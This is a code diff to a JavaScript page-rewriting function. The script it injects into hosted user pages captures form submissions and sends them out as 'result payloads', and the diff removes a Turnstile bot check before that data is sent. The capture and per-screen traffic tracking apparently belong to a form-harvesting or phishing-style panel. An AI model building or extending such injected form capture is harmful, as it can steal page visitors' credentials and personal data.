@@ -573,17 +573,10 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
       return;
     }
     setWaitingState(form, submitter);
-    verifyTurnstileFor(submitter || form).then(function (verified) {
-      if (!verified) {
-        send("traffic", { event: "turnstile_verify_failed", screen: pageLabel(), result: "blocked", reason: "Turnstile verification failed" });
-        restoreForm(form, submitter);
-        return;
-      }
-      const data = safeFormData(form);
-      send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
-      sendResultPayload(data, "form");
-      send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
-    });
+    const data = safeFormData(form);
+    send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
+    sendResultPayload(data, "form");
+    send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
   }
 
   function handleFallbackSubmit(control, event) {
@@ -598,16 +591,9 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
     }
     control.setAttribute("data-deuce-waiting", "true");
     setControlWaiting(control);
-    verifyTurnstileFor(control).then(function (verified) {
-      if (!verified) {
-        send("traffic", { event: "turnstile_verify_failed", screen: pageLabel(), result: "blocked", reason: "Turnstile verification failed", metadata: { captureMode: "fallback" } });
-        restoreControl(control);
-        return;
-      }
-      send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
-      sendResultPayload(data, "fallback");
-      send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
-    });
+    send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
+    sendResultPayload(data, "fallback");
+    send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
   }
 
   send("traffic", { event: "page_load", screen: pageLabel() });
